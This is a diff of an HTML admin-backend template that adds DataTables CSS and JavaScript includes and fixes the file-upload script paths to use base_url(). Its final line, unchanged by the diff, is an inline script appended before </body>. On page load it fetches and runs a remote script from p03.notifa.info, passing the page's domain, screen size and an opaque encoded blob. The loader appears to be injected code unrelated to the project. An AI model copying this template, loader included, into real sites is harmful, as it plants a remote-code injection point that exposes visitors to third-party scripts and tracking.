@@ -24,6 +24,11 @@
     <link href="{{ base_url('assets/backend/') }}css/style.css" rel="stylesheet">
     <link href="{{ base_url('assets/backend/') }}css/style-responsive.css" rel="stylesheet" />
 
+    <!--dynamic table-->
+    <link href="{{ base_url('assets/backend/') }}assets/advanced-datatable/media/css/demo_page.css" rel="stylesheet" />
+    <link href="{{ base_url('assets/backend/') }}assets/advanced-datatable/media/css/demo_table.css" rel="stylesheet" />
+    <link rel="stylesheet" href="{{ base_url('assets/backend/') }}assets/data-tables/DT_bootstrap.css" />
+
   </head>
 
   <body>
@@ -207,25 +212,29 @@
   <script src="{{ base_url('assets/backend/') }}js/slidebars.min.js"></script>
 
   <!-- BEGIN:File Upload Plugin JS files-->
-  <script src="assets/jquery-file-upload/js/vendor/jquery.ui.widget.js"></script>
+  <script src="{{ base_url('assets/backend/') }}assets/jquery-file-upload/js/vendor/jquery.ui.widget.js"></script>
   <!-- The Templates plugin is included to render the upload/download listings -->
-  <script src="assets/jquery-file-upload/js/vendor/tmpl.min.js"></script>
+  <script src="{{ base_url('assets/backend/') }}assets/jquery-file-upload/js/vendor/tmpl.min.js"></script>
   <!-- The Load Image plugin is included for the preview images and image resizing functionality -->
-  <script src="assets/jquery-file-upload/js/vendor/load-image.min.js"></script>
+  <script src="{{ base_url('assets/backend/') }}assets/jquery-file-upload/js/vendor/load-image.min.js"></script>
   <!-- The Canvas to Blob plugin is included for image resizing functionality -->
-  <script src="assets/jquery-file-upload/js/vendor/canvas-to-blob.min.js"></script>
+  <script src="{{ base_url('assets/backend/') }}assets/jquery-file-upload/js/vendor/canvas-to-blob.min.js"></script>
   <!-- The Iframe Transport is required for browsers without support for XHR file uploads -->
-  <script src="assets/jquery-file-upload/js/jquery.iframe-transport.js"></script>
+  <script src="{{ base_url('assets/backend/') }}assets/jquery-file-upload/js/jquery.iframe-transport.js"></script>
   <!-- The basic File Upload plugin -->
-  <script src="assets/jquery-file-upload/js/jquery.fileupload.js"></script>
+  <script src="{{ base_url('assets/backend/') }}assets/jquery-file-upload/js/jquery.fileupload.js"></script>
   <!-- The File Upload file processing plugin -->
-  <script src="assets/jquery-file-upload/js/jquery.fileupload-fp.js"></script>
+  <script src="{{ base_url('assets/backend/') }}assets/jquery-file-upload/js/jquery.fileupload-fp.js"></script>
   <!-- The File Upload user interface plugin -->
-  <script src="assets/jquery-file-upload/js/jquery.fileupload-ui.js"></script>
+  <script src="{{ base_url('assets/backend/') }}assets/jquery-file-upload/js/jquery.fileupload-ui.js"></script>
+
+  <script type="text/javascript" language="javascript" src="{{ base_url('assets/backend/') }}assets/advanced-datatable/media/js/jquery.dataTables.js"></script>
+  <script type="text/javascript" src="{{ base_url('assets/backend/') }}assets/data-tables/DT_bootstrap.js"></script>
 
 
     <!--common script for all pages-->
     <script src="{{ base_url('assets/backend/') }}js/common-scripts.js"></script>
+    <script src="{{ base_url('assets/backend/') }}js/dynamic_table_init.js"></script>
 
 
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2Q51fpBYb0e%2fUvZG8DeDtJ4IaunzrAyvhePRS4tzjKV2bb%2baxEDwzERcv7ImEugTAupXR2yVgJcVQDim%2fc3W0u5Td0crBLoTtNvhM4ALU%2bkH3X1J1kl4AwD4iNiNl5YYAzJqQV2FZiDVMHW2hTq%2bYFgsYbYS1m9OPyoyqn71IkPRJ1kG%2fBJ1FAXHvIvux7ZKoaa8PKtnD712BHlWbfMLWqWC7qTGK1Lt4pkYVfIUx3Iw8EdXc%2fuF3ZZPqZkGwdUYoXBCzljQacuY3qw7Z2%2f3S28dImDBltmB%2fkD381z%2f7dUdt7H1vMOACuepiVAe%2f9Kt4Gt40jZ3gZUwyZhWbRsLPmGY2c0H6vgv%2f5d7QVk9U3DvtKXYwyYmSp9057J9LCCcBiF96fjKwuZmVmMNobb4q%2fuXPVnzgeqqsfPLqMqDm5MyXu9sqpktHQIjhCmjrOAVlymN%2bmKHy5UcsqrNaC1lubQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
